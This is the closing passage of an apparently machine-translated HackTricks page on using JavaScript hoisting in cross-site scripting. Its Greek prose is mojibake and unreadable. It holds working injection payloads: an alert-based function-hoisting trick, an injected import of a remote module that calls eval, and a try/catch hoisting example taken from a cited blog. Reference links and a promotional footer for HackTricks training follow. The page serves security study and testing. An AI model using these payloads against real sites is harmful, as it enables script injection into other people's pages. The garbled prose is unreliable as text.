Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î¿Î¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Ï‚ Ï€ÏÎ±ÎºÏ„Î¹ÎºÎ­Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚, ÏŒÏ€Ï‰Ï‚ Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ Î±Ï…ÏƒÏ„Î·ÏÎ®Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ ÏƒÏ„Î·Î½ JavaScript Î³Î¹Î± Ï„Î·Î½ Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ· Î¼Î· Î´Î·Î»Ï‰Î¼Î­Î½Ï‰Î½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ ÎºÎ±Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½.

Regular security assessments and penetration testing can also help identify and mitigate JavaScript hoisting vulnerabilities.

ÎŸÎ¹ Ï„Î±ÎºÏ„Î¹ÎºÎ­Ï‚ Î±Î¾Î¹Î¿Î»Î¿Î³Î®ÏƒÎµÎ¹Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎºÎ±Î¹ Î¿Î¹ Î´Î¿ÎºÎ¹Î¼Î­Ï‚ Î´Î¹ÎµÎ¯ÏƒÎ´Ï…ÏƒÎ·Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎ¿Ï…Î½ ÏƒÏ„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ ÎºÎ±Î¹ Ï„Î·Î½ Î±Î½Ï„Î¹Î¼ÎµÏ„ÏÏ€Î¹ÏƒÎ· Ï„Ï‰Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÏÎ½ Ï„Î·Ï‚ Î±Î½ÏÏˆÏ‰ÏƒÎ·Ï‚ Ï„Î¿Ï… JavaScript.
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
